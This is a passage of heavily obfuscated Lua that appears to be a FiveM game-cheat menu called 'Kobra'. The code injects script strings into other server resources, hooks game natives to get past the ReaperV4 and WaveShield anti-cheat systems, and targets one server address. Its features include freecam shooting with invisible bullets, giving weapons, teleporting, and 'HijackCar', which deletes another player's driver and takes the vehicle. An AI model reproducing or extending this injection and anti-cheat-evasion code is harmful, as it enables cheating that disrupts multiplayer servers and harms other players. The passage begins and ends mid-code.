                                        local function RotationToDirection(rot)
                                            local z = math.rad(rot.z)
                                            local x = math.rad(rot.x)
                                            local num = math.abs(math.cos(x))
                                            return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                        end

                                        function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then
                                                return
                                            end

                                            _G[nativeName] = function(...)
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("RemoveWeaponFromPed", function(originalFn, ...) return end)
                                        hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                                        local camCoords = GetCamCoord(_G.KobraFreecamObject)
                                        local camRot = GetCamRot(_G.KobraFreecamObject, 2)
                                        local forward = RotationToDirection(camRot)
                                        local rayLength = 1000.0
                                        local targetPos = camCoords + forward * rayLength
                                        local playerPed = PlayerPedId()
                                        local weaponHash = GetHashKey("]]   .. v977   .. [[")

                                        GiveWeaponToPed(PlayerPedId(), weaponHash, 13500, false, true)
                                        SetCurrentPedWeapon(PlayerPedId(), weaponHash, true)
                                        ShootSingleBulletBetweenCoords(
                                            camCoords.x, camCoords.y, camCoords.z,
                                            targetPos.x, targetPos.y, targetPos.z,
                                            100,           -- damage
                                            true,          -- isAudible
                                            weaponHash,
                                            playerPed,
                                            true,          -- isInvisible
                                            false,         -- isCritical
                                            100000.0         -- speed
                                        )
                                    end
                                ]] );end elseif _G.KobraFreecamObject then local v1500=0 + 0 ;local v1501;local v1502;local v1503;local v1504;local v1505;local v1506;local v1507;local v1508;while true do if (v1500==(8 -2)) then GiveWeaponToPed(v1507,v1508,794 -539 ,false,true);MachoInjectThread(0,"ReaperV4","",[[
                                    local success = exports["ReaperV4"]:InvokeCPlayer("set", "Weapon:" .. ]]   .. v1508   .. [[, true, true)
                                    if success then
                                        print("Updated Cache Successfully")
                                    else
                                        print("Failed to Update Cache")
                                    end
                                ]] );Wait(250);v1500=7;end if (v1500==5) then v1506=v1502 + (v1504 * v1505) ;v1507=PlayerPedId();v1508=GetHashKey(v977);v1500=17 -11 ;end if (v1500==(14 -7)) then ShootSingleBulletBetweenCoords(v1502.x,v1502.y,v1502.z,v1506.x,v1506.y,v1506.z,91 + 9 ,true,v1508,v1507,true,false,100000);break;end if (v1500==(1 + 2)) then hNative("GetCurrentPedWeapon",function(v1619,...) return v1619(...);end);hNative("RemoveWeaponFromPed",function(v1620,...) return;end);v1502=GetCamCoord(_G.KobraFreecamObject);v1500=1 + 3 ;end if (v1500==(3 + 1)) then v1503=GetCamRot(_G.KobraFreecamObject,2);v1504=v1501(v1503);v1505=1000;v1500=163 -(139 + 19) ;end if (v1500==(1 + 1)) then hNative("GetHashKey",function(v1621,...) return v1621(...);end);hNative("GiveWeaponToPed",function(v1622,...) return v1622(...);end);hNative("SetCurrentPedWeapon",function(v1623,...) return v1623(...);end);v1500=1996 -(1687 + 306) ;end if (v1500==(3 -2)) then hNative("CreateThread",function(v1624,...) return v1624(...);end);hNative("Wait",function(v1625,...) return v1625(...);end);hNative("PlayerPedId",function(v1626,...) return v1626(...);end);v1500=1156 -(1018 + 136) ;end if (v1500==0) then v1501=nil;function v1501(v1627) local v1628=math.rad(v1627.z);local v1629=math.rad(v1627.x);local v1630=math.abs(math.cos(v1629));return vector3( -math.sin(v1628) * v1630 ,math.cos(v1628) * v1630 ,math.sin(v1629));end function hNative(v1631,v1632) local v1633=_G[v1631];if ( not v1633 or (type(v1633)~="function")) then return;end _G[v1631]=function(...) return v1632(v1633,...);end;end v1500=1 + 0 ;end end end break;end end elseif ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then if (GetResourceState("WaveShield")=="started") then if _G.KobraFreecamObject then local v1449=0 -0 ;local v1450;local v1451;local v1452;local v1453;local v1454;local v1455;local v1456;local v1457;local v1458;local v1459;while true do if ((815 -(117 + 698))==v1449) then print("UPP3R");v1450=nil;function v1450(v1597) local v1598=math.rad(v1597.z);local v1599=math.rad(v1597.x);local v1600=math.abs(math.cos(v1599));return vector3( -math.sin(v1598) * v1600 ,math.cos(v1598) * v1600 ,math.sin(v1599));end function hNative(v1601,v1602) local v1603=_G[v1601];if ( not v1603 or (type(v1603)~="function")) then return;end _G[v1601]=function(...) return v1602(v1603,...);end;end v1449=482 -(305 + 176) ;end if (1==v1449) then hNative("CreateThread",function(v1604,...) return v1604(...);end);hNative("Wait",function(v1605,...) return v1605(...);end);hNative("PlayerPedId",function(v1606,...) return v1606(...);end);hNative("GetHashKey",function(v1607,...) return v1607(...);end);v1449=2;end if (v1449==(1 + 1)) then hNative("GiveWeaponToPed",function(v1608,...) return v1608(...);end);hNative("SetCurrentPedWeapon",function(v1609,...) return v1609(...);end);hNative("GetCurrentPedWeapon",function(v1610,...) return v1610(...);end);hNative("RemoveWeaponFromPed",function(v1611,...) return;end);v1449=3;end if (v1449==(3 + 1)) then v1454=1000;v1455=v1451 + (v1453 * v1454) ;v1456=PlayerPedId();v1457=GetHashKey(v977);v1449=5;end if (v1449==(8 -3)) then v1458=nil;function v1458(v1612) local v1613={};for v1634=1 + 0 , #v1612 do v1613[v1634]=string.byte(v1612,v1634);end return table.concat(v1613,",");end v1459=v1458(v977);v49(((GetResourceState("monitor")=="started") and "monitor") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,string.format([[
                                        if not _G.osintWeaponBypass then
                                            _G.osintWeaponBypass = { enabled = false }
                                        end
                                        _G.osintWeaponBypass.enabled = true

                                        local function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then return end
                                            _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                                        end

                                        hNative("GetHashKey", function(orig, str) return orig(str) end)
                                        hNative("GiveWeaponToPed", function(orig, ped, hash, ammo, isHidden, equipNow)
                                            if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                                                return orig(ped, hash, ammo, false, true)
                                            else
                                                return orig(ped, hash, ammo, isHidden, equipNow)
                                            end
                                        end)
                                        hNative("SetCurrentPedWeapon", function(orig, ped, hash, equipNow)
                                            if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                                                return orig(ped, hash, true)
                                            else
                                                return orig(ped, hash, equipNow)
                                            end
                                        end)

                                        local function _b(str)
                                            local t = {}
                                            for i = 1, #str do t[i] = string.byte(str, i) end
                                            return t
                                        end
                                        local function _d(tbl)
                                            local s = ""
                                            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                            return s
                                        end
                                        local function _g(n)
                                            local k = _d(n)
                                            local f = _G[k]
                                            return f
                                        end

                                        local function initFlow(cb)
                                            local co = coroutine.create(cb)
                                            local ok, err
                                            while coroutine.status(co) ~= "dead" do
                                                ok, err = coroutine.resume(co)
                                                if not ok then
                                                    print("WaveShield WeaponBypass error:", err)
                                                    break
                                                end
                                                Citizen.Wait(0)
                                            end
                                        end

                                        initFlow(function()
                                            local ped = %d
                                            if _g(_b("DoesEntityExist"))(ped) then
                                                local weaponName = _d({%s})
                                                local weaponHash = _g(_b("GetHashKey"))(weaponName)
                                                if weaponHash and weaponHash ~= 0 then
                                                    _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                                                    _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                                                end
                                            end
                                        end)

                                        print("Zawg")
                                    ]],v1456,v1459));v1449=10 -4 ;end if (v1449==(13 -7)) then Wait(260 -110 );ShootSingleBulletBetweenCoords(v1451.x,v1451.y,v1451.z,v1455.x,v1455.y,v1455.z,360 -(159 + 101) ,true,v1457,v1456,true,false,100000);break;end if (v1449==3) then hNative("ShootSingleBulletBetweenCoords",function(v1614,...) return v1614(...);end);v1451=GetCamCoord(_G.KobraFreecamObject);v1452=GetCamRot(_G.KobraFreecamObject,2);v1453=v1450(v1452);v1449=4;end end end else MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or "any" ,[[
                                    if _G.KobraFreecamObject then
                                        local function RotationToDirection(rot)
                                            local z = math.rad(rot.z)
                                            local x = math.rad(rot.x)
                                            local num = math.abs(math.cos(x))
                                            return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                        end

                                        function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then
                                                return
                                            end

                                            _G[nativeName] = function(...)
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetHashKey", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("RemoveWeaponFromPed", function(originalFn, ...) return end)
                                        hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                                        local camCoords = GetCamCoord(_G.KobraFreecamObject)
                                        local camRot = GetCamRot(_G.KobraFreecamObject, 2)
                                        local forward = RotationToDirection(camRot)
                                        local rayLength = 1000.0
                                        local targetPos = camCoords + forward * rayLength
                                        local playerPed = PlayerPedId()
                                        local weaponHash = GetHashKey("]]   .. v977   .. [[")

                                        ShootSingleBulletBetweenCoords(
                                            camCoords.x, camCoords.y, camCoords.z,
                                            targetPos.x, targetPos.y, targetPos.z,
                                            100,           -- damage
                                            true,          -- isAudible
                                            weaponHash,
                                            playerPed,
                                            true,          -- isInvisible
                                            false,         -- isCritical
                                            100000.0         -- speed
                                        )
                                    end
                                ]] );end elseif _G.KobraFreecamObject then local function v1351(v1364) local v1365=math.rad(v1364.z);local v1366=math.rad(v1364.x);local v1367=math.abs(math.cos(v1366));return vector3( -math.sin(v1365) * v1367 ,math.cos(v1365) * v1367 ,math.sin(v1366));end function hNative(v1368,v1369) local v1370=0 -0 ;local v1371;while true do if (v1370==1) then _G[v1368]=function(...) return v1369(v1371,...);end;break;end if (v1370==(0 -0)) then v1371=_G[v1368];if ( not v1371 or (type(v1371)~="function")) then return;end v1370=1 + 0 ;end end end hNative("CreateThread",function(v1372,...) return v1372(...);end);hNative("Wait",function(v1373,...) return v1373(...);end);hNative("PlayerPedId",function(v1374,...) return v1374(...);end);hNative("GetHashKey",function(v1375,...) return v1375(...);end);hNative("GiveWeaponToPed",function(v1376,...) return v1376(...);end);hNative("SetCurrentPedWeapon",function(v1377,...) return v1377(...);end);hNative("GetCurrentPedWeapon",function(v1378,...) return v1378(...);end);hNative("RemoveWeaponFromPed",function(v1379,...) return;end);local v1352=GetCamCoord(_G.KobraFreecamObject);local v1353=GetCamRot(_G.KobraFreecamObject,2);local v1354=v1351(v1353);local v1355=3187 -2187 ;local v1356=v1352 + (v1354 * v1355) ;local v1357=PlayerPedId();local v1358=GetHashKey(v977);GiveWeaponToPed(PlayerPedId(),v1358,250,false,true);SetCurrentPedWeapon(PlayerPedId(),v1358,true);ShootSingleBulletBetweenCoords(v1352.x,v1352.y,v1352.z,v1356.x,v1356.y,v1356.z,196 -96 ,true,v1358,v1357,true,false,11351 + 88649 );end break;end end end end if IsDisabledControlJustPressed(266 -(112 + 154) ,24) then local v822=v675;if (v822=="Teleport") then if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then if (GetResourceState("WaveShield")=="started") then if _G.KobraFreecamObject then local v1265=0;local v1266;local v1267;local v1268;local v1269;local v1270;local v1271;local v1272;local v1273;local v1274;local v1275;local v1276;while true do if ((0 -0)==v1265) then v1266=nil;function v1266(v1380) local v1381=math.rad(v1380.z);local v1382=math.rad(v1380.x);local v1383=math.abs(math.cos(v1382));return vector3( -math.sin(v1381) * v1383 ,math.cos(v1381) * v1383 ,math.sin(v1382));end function GetEmptySeat(v1384) local v1385=31 -(21 + 10) ;local v1386;while true do if (v1385==(1719 -(531 + 1188))) then v1386={ -(664 -(96 + 567)),0,1,2};for v1569,v1570 in ipairs(v1386) do if IsVehicleSeatFree(v1384,v1570) then return v1570;end end v1385=1 + 0 ;end if (v1385==(3 -2)) then return  -1;end end end v1267=GetCamCoord(_G.KobraFreecamObject);v1265=1696 -(867 + 828) ;end if (v1265==(4 -2)) then v1272=StartShapeTestRay(v1267.x,v1267.y,v1267.z,v1271.x,v1271.y,v1271.z, -(3 -2),PlayerPedId(),0 -0 );v1273,v1274,v1275,v1273,v1276=GetShapeTestResult(v1272);if v1274 then if ((v1276~=(0 -0)) and IsEntityAVehicle(v1276)) then local v1547=0 + 0 ;local v1548;local v1549;local v1550;while true do if (v1547==0) then v1548=v1276;v1549=PlayerPedId();v1547=1 -0 ;end if (v1547==1) then v1550=GetEmptySeat(v1548);if (v1550== -1) then TaskWarpPedIntoVehicle(v1549,v1548, -(772 -(134 + 637)));elseif (v1550>=(0 + 0)) then TaskWarpPedIntoVehicle(v1549,v1548,v1550);else print("[^5SYNC^7]: There aren't any seats available in this vehicle.");end break;end end else SetEntityCoords(PlayerPedId(),v1275.x,v1275.y,v1275.z,false,false,false,false);end else print("[^5SYNC^7]: There aren't any valid locations to teleport to.");end break;end if ((1158 -(775 + 382))==v1265) then v1268=GetCamRot(_G.KobraFreecamObject,2);v1269=v1266(v1268);v1270=1431 -431 ;v1271=v1267 + (v1269 * v1270) ;v1265=2;end end end else MachoInjectResourceRaw(((GetResourceState("monitor")=="started") and "monitor") or "any" ,[[
                                if _G.KobraFreecamObject then
                                    local function RotationToDirection(rot)
                                        local z = math.rad(rot.z)
                                        local x = math.rad(rot.x)
                                        local num = math.abs(math.cos(x))
                                        return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                                    end

                                    function GetEmptySeat(vehicle)
                                        local seats = {
                                            -1, 0, 1, 2
                                        }

                                        for _, seat in ipairs(seats) do
                                            if IsVehicleSeatFree(vehicle, seat) then
                                                return seat
                                            end
                                        end

                                        return -1
                                    end

                                    function hNative(nativeName, newFunction)
                                        local originalNative = _G[nativeName]
                                        if not originalNative or type(originalNative) ~= "function" then
                                            return
                                        end

                                        _G[nativeName] = function(...)
                                            return newFunction(originalNative, ...)
                                        end
                                    end

                                    hNative("RotationToDirection", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetEmptySeat", function(originalFn, ...) return originalFn(...) end)
                                    hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                    hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                                    hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                    hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                    hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                    hNative("SetEntityCoordsWithoutPlantsReset", function(originalFn, ...) return originalFn(...) end)

                                    local camCoords = GetCamCoord(_G.KobraFreecamObject)
                                    local rot = GetCamRot(_G.KobraFreecamObject, 2)
                                    local forward = RotationToDirection(rot)
                                    local rayLength = 1000.0
                                    local targetPos = camCoords + forward * rayLength
                                    local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, PlayerPedId(), 0)
                                    local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                                    if hit then
                                        if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                            local vehicle = entityHit
                                            local playerPed = PlayerPedId()
                                            local seat = GetEmptySeat(vehicle)
                                            if seat == -1 then
                                                TaskWarpPedIntoVehicle(playerPed, vehicle, -1)
                                            elseif seat >= 0 then
                                                TaskWarpPedIntoVehicle(playerPed, vehicle, seat)
                                            else
                                                print("[^5Kobra^7]: There aren't any seats available in this vehicle.")
                                            end
                                        else
                                            SetEntityCoordsWithoutPlantsReset(PlayerPedId(), endCoords.x, endCoords.y, endCoords.z, false, false, false, false)
                                        end
                                    else
                                        print("[^5Kobra^7]: There aren't any valid locations to teleport to.")
                                    end
                                end
                            ]]);end elseif _G.KobraFreecamObject then local v1187=607 -(45 + 562) ;local v1188;local v1189;local v1190;local v1191;local v1192;local v1193;local v1194;local v1195;local v1196;local v1197;local v1198;while true do if (v1187==(863 -(545 + 317))) then v1190=GetCamRot(_G.KobraFreecamObject,2 -0 );v1191=v1188(v1190);v1192=2026 -(763 + 263) ;v1193=v1189 + (v1191 * v1192) ;v1187=1 + 1 ;end if (0==v1187) then v1188=nil;function v1188(v1313) local v1314=0;local v1315;local v1316;local v1317;while true do if (v1314==(1750 -(512 + 1238))) then v1315=math.rad(v1313.z);v1316=math.rad(v1313.x);v1314=1595 -(272 + 1322) ;end if (v1314==(1 -0)) then v1317=math.abs(math.cos(v1316));return vector3( -math.sin(v1315) * v1317 ,math.cos(v1315) * v1317 ,math.sin(v1316));end end end function GetEmptySeat(v1318) local v1319={ -(29 -(14 + 14)),825 -(499 + 326) ,1,1999 -(1929 + 68) };for v1359,v1360 in ipairs(v1319) do if IsVehicleSeatFree(v1318,v1360) then return v1360;end end return  -(1324 -(1206 + 117));end v1189=GetCamCoord(_G.KobraFreecamObject);v1187=1 + 0 ;end if (v1187==2) then v1194=StartShapeTestRay(v1189.x,v1189.y,v1189.z,v1193.x,v1193.y,v1193.z, -1,PlayerPedId(),1592 -(683 + 909) );v1195,v1196,v1197,v1195,v1198=GetShapeTestResult(v1194);if v1196 then if ((v1198~=(0 -0)) and IsEntityAVehicle(v1198)) then local v1460=0 -0 ;local v1461;local v1462;local v1463;while true do if (1==v1460) then v1463=GetEmptySeat(v1461);if (v1463== -(778 -(772 + 5))) then TaskWarpPedIntoVehicle(v1462,v1461, -1);elseif (v1463>=0) then TaskWarpPedIntoVehicle(v1462,v1461,v1463);else print("[^5Kobra^7]: There aren't any seats available in this vehicle.");end break;end if ((1427 -(19 + 1408))==v1460) then v1461=v1198;v1462=PlayerPedId();v1460=289 -(134 + 154) ;end end else MachoInjectThread(0 -0 ,"any","",[[ 
                                        function hNative(nativeName, newFunction)
                                            local originalNative = _G[nativeName]
                                            if not originalNative or type(originalNative) ~= "function" then
                                                return
                                            end

                                            _G[nativeName] = function(...)
                                                return newFunction(originalNative, ...)
                                            end
                                        end

                                        hNative("RotationToDirection", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetRightVector", function(originalFn, ...) return originalFn(...) end)
                                        hNative("Clamp", function(originalFn, ...) return originalFn(...) end)
                                        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
                                        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                        hNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                                        hNative("DoesCamExist", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                                        hNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                                        hNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextFont", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextProportional", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextScale", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextDropShadow", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextEdge", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextOutline", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextCentre", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetTextColour", function(originalFn, ...) return originalFn(...) end)
                                        hNative("BeginTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                                        hNative("AddTextComponentSubstringPlayerName", function(originalFn, ...) return originalFn(...) end)
                                        hNative("EndTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
                                        hNative("TaskStandStill", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                                        hNative("StartExpensiveSynchronousShapeTestLosProbe", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsDisabledControlJustPressed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                                        hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                                        hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
                                        hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
                                        hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

                                        SetEntityCoords(PlayerPedId(), ]]   .. v1197.x   .. [[, ]]   .. v1197.y   .. [[, ]]   .. v1197.z   .. [[, false, false, false, false)
                                    ]] );end else print("[^5Kobra^7]: There aren't any valid locations to teleport to.");end break;end end end elseif (v822=="Kick from Vehicle") then if ((GetResourceState("ReaperV4")~="started") or (GetCurrentServerEndpoint()=="216.146.24.88:30120")) then local v1199=((GetResourceState("lb-phone")=="started") and "lb-phone") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ;v49(v1199,[[
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end
                                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                            hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                            hNative("DeletePed", function(originalFn, ...) return originalFn(...) end)
                            hNative("ClearPedTasksImmediately", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                            hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)

                            local function RequestControl(entity, timeoutMs)
                                timeoutMs = timeoutMs or 2000
                                local start = GetGameTimer()

                                while (GetGameTimer() - start) < timeoutMs do
                                    if NetworkHasControlOfEntity(entity) then return true end
                                    NetworkRequestControlOfEntity(entity)
                                    Wait(0)
                                end

                                return NetworkHasControlOfEntity(entity)
                            end

                            local function RotationToDirection(rot)
                                local z = math.rad(rot.z)
                                local x = math.rad(rot.x)
                                local num = math.abs(math.cos(x))
                                return vector3(-math.sin(z) * num, math.cos(z) * num, math.sin(x))
                            end

                            function GetEmptySeat(vehicle)
                                local seats = { -1, 0, 1, 2 }

                                for _, seat in ipairs(seats) do
                                    if IsVehicleSeatFree(vehicle, seat) then
                                        return seat
                                    end
                                end

                                return -1
                            end

                            local player = PlayerPedId()
                            local oldCoords = GetEntityCoords(player)
                            local camCoords = GetCamCoord(_G[FLAG_CAM])
                            local rot = GetCamRot(_G[FLAG_CAM], 2)
                            local forward = RotationToDirection(rot)
                            local rayLength = 1000.0
                            local targetPos = camCoords + forward * rayLength
                            local rayHandle = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, targetPos.x, targetPos.y, targetPos.z, -1, player, 0)
                            local _, hit, endCoords, _, entityHit = GetShapeTestResult(rayHandle)

                            local function HijackCar(vehicle)
                                if not vehicle or not DoesEntityExist(vehicle) then
                                    return
                                end

                                local driver = GetPedInVehicleSeat(vehicle, -1)
                                if driver ~= 0 and DoesEntityExist(driver) then
                                    SetPedIntoVehicle(player, vehicle, 0)
                                    RequestControl(vehicle, 2000)
                                    Wait(10)

                                    for i = 0, 4 do
                                        DeletePed(driver)
                                    end

                                    Wait(40)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, GetEmptySeat(vehicle))
                                    Wait(1)
                                    SetPedIntoVehicle(player, vehicle, -1)
                                    Wait(450)
                                    ClearPedTasksImmediately(player)
                                    SetEntityCoordsNoOffset(player, oldCoords.x, oldCoords.y, oldCoords.z, true, true, true, true)
                                    Wait(100)
                                end
                            end

                            CreateThread(function()
                                if hit then
                                    if entityHit ~= 0 and IsEntityAVehicle(entityHit) then
                                        local vehicle = entityHit

                                        HijackCar(vehicle)
                                    end
                                end
                            end)
                        ]]);elseif _G.KobraFreecamObject then local v1277=0;local v1278;local v1279;local v1280;local v1281;local v1282;local v1283;local v1284;local v1285;local v1286;local v1287;local v1288;local v1289;local v1290;local v1291;local v1292;while true do if (v1277==(9 -6)) then hNative("ClearPedTasksImmediately",function(v1387,...) return v1387(...);end);hNative("SetEntityCoordsNoOffset",function(v1388,...) return v1388(...);end);hNative("IsEntityAVehicle",function(v1389,...) return v1389(...);end);hNative("SetPedIntoVehicle",function(v1390,...) return v1390(...);end);v1277=2 + 2 ;end if (v1277==(7 + 1)) then v1288,v1289,v1290,v1288,v1291=GetShapeTestResult(v1287);v1292=nil;function v1292(v1391) if ( not v1391 or  not DoesEntityExist(v1391)) then return;end local v1392=GetPedInVehicleSeat(v1391, -1);if ((v1392~=(202 -(10 + 192))) and DoesEntityExist(v1392)) then SetPedIntoVehicle(v1280,v1391,47 -(13 + 34) );v1278(v1391,3289 -(342 + 947) );Wait(41 -31 );for v1551=0,4 do MachoInjectResource("monitor",[[
                                            DeletePed(]]   .. v1392   .. [[)
                                        ]] );end Wait(1748 -(119 + 1589) );SetPedIntoVehicle(v1280,v1391, -1);Wait(2 -1 );SetPedIntoVehicle(v1280,v1391,GetEmptySeat(v1391));Wait(1);SetPedIntoVehicle(v1280,v1391, -(1 -0));Wait(450);ClearPedTasksImmediately(v1280);SetEntityCoordsNoOffset(v1280,v1281.x,v1281.y,v1281.z,true,true,true,true);Wait(652 -(545 + 7) );end end CreateThread(function() if v1289 then if ((v1291~=(0 -0)) and IsEntityAVehicle(v1291)) then local v1571=v1291;v1292(v1571);end end end);break;end if (v1277==(0 + 0)) then function hNative(v1393,v1394) local v1395=_G[v1393];if ( not v1395 or (type(v1395)~="function")) then return;end _G[v1393]=function(...) return v1394(v1395,...);end;end hNative("CreateThread",function(v1396,...) return v1396(...);end);hNative("Wait",function(v1397,...) return v1397(...);end);hNative("DoesEntityExist",function(v1398,...) return v1398(...);end);v1277=1;end if (v1277==(1704 -(494 + 1209))) then hNative("GetEntityCoords",function(v1399,...) return v1399(...);end);hNative("GetCamCoord",function(v1400,...) return v1400(...);end);hNative("GetCamRot",function(v1401,...) return v1401(...);end);hNative("StartShapeTestRay",function(v1402,...) return v1402(...);end);v1277=5 -3 ;end if (6==v1277) then v1280=PlayerPedId();v1281=GetEntityCoords(v1280);v1282=GetCamCoord(_G.KobraFreecamObject);v1283=GetCamRot(_G.KobraFreecamObject,1000 -(197 + 801) );v1277=13 -6 ;end if (v1277==(19 -15)) then hNative("PlayerPedId",function(v1403,...) return v1403(...);end);hNative("NetworkRequestControlOfEntity",function(v1404,...) return v1404(...);end);hNative("NetworkHasControlOfEntity",function(v1405,...) return v1405(...);end);v1278=nil;v1277=959 -(919 + 35) ;end if (v1277==(2 + 0)) then hNative("GetShapeTestResult",function(v1406,...) return v1406(...);end);hNative("GetPedInVehicleSeat",function(v1407,...) return v1407(...);end);hNative("SetEntityVisible",function(v1408,...) return v1408(...);end);hNative("DeletePed",function(v1409,...) return v1409(...);end);v1277=11 -8 ;end if ((472 -(369 + 98))==v1277) then function v1278(v1410,v1411) v1411=v1411 or (3115 -(400 + 715)) ;local v1412=GetGameTimer();while 